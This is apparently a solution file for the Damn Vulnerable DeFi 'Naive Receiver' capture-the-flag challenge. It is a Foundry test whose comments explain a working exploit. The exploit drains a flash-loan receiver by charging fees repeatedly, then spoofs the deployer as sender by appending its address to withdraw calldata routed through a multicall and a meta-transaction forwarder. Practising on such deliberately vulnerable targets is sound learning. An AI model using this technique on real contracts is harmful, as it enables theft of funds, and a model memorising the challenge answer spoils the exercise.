// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";

contract NaiveReceiverChallenge is Test {
    address deployer = makeAddr("deployer");
    address recovery = makeAddr("recovery");
    address player;
    uint256 playerPk;

    uint256 constant WETH_IN_POOL = 1000e18;
    uint256 constant WETH_IN_RECEIVER = 10e18;

    NaiveReceiverPool pool;
    WETH weth;
    FlashLoanReceiver receiver;
    BasicForwarder forwarder;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        (player, playerPk) = makeAddrAndKey("player");
        // Simulates actions from the deployer account by manipulating the blockchain state to set initial conditions without actual transactions.
        startHoax(deployer);

        // Deploy WETH
        weth = new WETH();

        // Deploy forwarder
        forwarder = new BasicForwarder();

        // Deploy pool and fund with ETH
        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(address(forwarder), payable(weth), deployer);

        // Deploy flashloan receiver contract and fund it with some initial WETH
        receiver = new FlashLoanReceiver(address(pool));
        weth.deposit{value: WETH_IN_RECEIVER}();
        weth.transfer(address(receiver), WETH_IN_RECEIVER);

        vm.stopPrank();
    }

    function test_assertInitialState() public {
        // Check initial balances
        assertEq(weth.balanceOf(address(pool)), WETH_IN_POOL);
        assertEq(weth.balanceOf(address(receiver)), WETH_IN_RECEIVER);

        // Check pool config
        assertEq(pool.maxFlashLoan(address(weth)), WETH_IN_POOL);
        assertEq(pool.flashFee(address(weth), 0), 1 ether);
        assertEq(pool.feeReceiver(), deployer);

        // Cannot call receiver
        vm.expectRevert(0x48f5c3ed);
        receiver.onFlashLoan(
            deployer,
            address(weth), // token
            WETH_IN_RECEIVER, // amount
            1 ether, // fee
            bytes("") // data
        );
    }

    /**
     * The goal is to exploit vulnerabilities in the NaiveReceiverPool and FlashLoanReceiver to drain all WETH from the receiver and the pool, and then transfer it to a recovery account.
     */
    function test_naiveReceiver() public checkSolvedByPlayer {
        bytes[] memory callDatas = new bytes[](11);
        /**
         * The function constructs an array of call data callDatas for 11 calls. 
         * The first 10 iterations of the loop encode calls to the flashLoan function of the NaiveReceiverPool, 
         * each attempting to trigger the flash loan mechanism on the FlashLoanReceiver with a loan amount of 0 and empty data. 
         * These calls exploit the receiver’s failure to properly handle flash loan fees, draining its WETH by repeatedly incurring fees.
         */
        for (uint256 i = 0; i < 10; i++) {
            callDatas[i] = abi.encodeCall(NaiveReceiverPool.flashLoan, (receiver, address(weth), 0, "0x"));
        }
        /**
         * The 11th call encodes a call to withdraw from NaiveReceiverPool to transfer all remaining WETH (from both the pool and the receiver) to the recovery account. 
         * This step assumes the previous calls successfully depleted the receiver's WETH balance.
         */
        callDatas[10] = abi.encodePacked(
            abi.encodeCall(NaiveReceiverPool.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))),
            bytes32(uint256(uint160(deployer)))
        );

        bytes memory callData;
        /**
         * All individual call data entries are combined into a single call to pool.multicall, 
         * which allows executing all 11 operations in one transaction, utilizing the Multicall functionality embedded in the pool.
         */
        callData = abi.encodeCall(pool.multicall, callDatas);

        // A BasicForwarder.Request is then created, packaging the multicall as a meta-transaction.
        BasicForwarder.Request memory request =
            BasicForwarder.Request(player, address(pool), 0, gasleft(), forwarder.nonces(player), callData, 1 days);
        
        // The request is hashed using the EIP-712 standard, which involves the domain separator from the forwarder and the data-specific hash.
        bytes32 requestHash =
            keccak256(abi.encodePacked("\x19\x01", forwarder.domainSeparator(), forwarder.getDataHash(request)));
        
        /**
         * Using the player's private key (playerPk), the request hash is signed. 
         * This step is simulated using Foundry's vm.sign, which mimics the cryptographic signing process.
         */
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, requestHash);
        bytes memory signature = abi.encodePacked(r, s, v);
        /**
         * The signed request is sent to the forwarder.execute, which processes the meta-transaction. 
         * If the validation and execution are successful, this transaction will execute the multicall, 
         * which in turn processes all the flash loans and the withdrawal, thereby solving the challenge.
         */
        forwarder.execute(request, signature);
    }
    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */

    function _isSolved() private view {
        // Player must have executed two or less transactions
        assertLe(vm.getNonce(player), 2);

        // The flashloan receiver contract has been emptied
        assertEq(weth.balanceOf(address(receiver)), 0, "Unexpected balance in receiver contract");

        // Pool is empty too
        assertEq(weth.balanceOf(address(pool)), 0, "Unexpected balance in pool");

        // All funds sent to recovery account
        assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER, "Not enough WETH in recovery account");
    }
}
